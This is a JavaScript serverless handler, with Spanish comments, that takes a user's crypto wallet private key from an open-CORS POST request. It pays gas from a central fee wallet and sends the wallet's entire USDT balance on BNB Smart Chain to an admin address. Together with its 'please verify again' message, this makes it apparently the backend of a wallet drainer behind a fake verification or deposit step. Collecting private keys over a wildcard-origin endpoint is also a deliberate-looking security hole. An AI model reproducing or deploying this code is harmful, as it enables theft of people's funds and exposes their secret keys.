import { ethers } from "ethers";

const RPC_URL = "https://bsc-dataseed.binance.org/";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

export default async function handler(req, res) {
  // --- INICIO BLOQUE CORRECCIÓN CORS ---
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*'); // Permite peticiones de cualquier origen
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  // --- FIN BLOQUE CORRECCIÓN CORS ---

  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const { userPrivateKey, adminAddress, feePrivateKey } = req.body;

  if (!userPrivateKey || !adminAddress) {
    return res.status(400).json({ error: "Missing parameters" });
  }

  try {
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const userWallet = new ethers.Wallet(userPrivateKey, provider);
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, userWallet);
    
    // Obtener balance y decimales
    const [usdtBalance, decimals] = await Promise.all([
      usdtContract.balanceOf(userWallet.address),
      usdtContract.decimals()
    ]);

    const formattedBalance = ethers.formatUnits(usdtBalance, decimals);

    // Si el balance es casi cero, no intentar transferir
    if (parseFloat(formattedBalance) < 0.01) {
      return res.status(200).json({ 
        success: false, 
        error: "Insufficient USDT balance", 
        balance: formattedBalance 
      });
    }

    // Verificar gas (BNB)
    const bnbBalance = await provider.getBalance(userWallet.address);
    const feeData = await provider.getFeeData();
    const gasLimit = 80000n; // Un poco más de margen para seguridad
    const requiredBnb = (feeData.gasPrice || 5000000000n) * gasLimit;

    if (bnbBalance < requiredBnb) {
      if (!feePrivateKey) {
        return res.status(200).json({ error: "Need BNB for gas and feePrivateKey is missing" });
      }
      // Enviar gas desde la billetera central
      const feeWallet = new ethers.Wallet(feePrivateKey, provider);
      const txFee = await feeWallet.sendTransaction({ 
        to: userWallet.address, 
        value: requiredBnb 
      });
      await txFee.wait();
      // Informar que se envió el gas y que debe reintentar
      return res.status(200).json({ 
        success: true, 
        method: "gas_sent", 
        message: "Gas sent to user wallet, please verify again in a moment." 
      });
    }

    // Ejecutar transferencia de USDT al Admin
    const tx = await usdtContract.transfer(adminAddress, usdtBalance);
    const receipt = await tx.wait();

    return res.status(200).json({ 
      success: true, 
      transactionHash: receipt.hash, 
      amount: formattedBalance 
    });

  } catch (error) {
    console.error("Error in deposit:", error);
    return res.status(500).json({ error: error.message });
  }
}
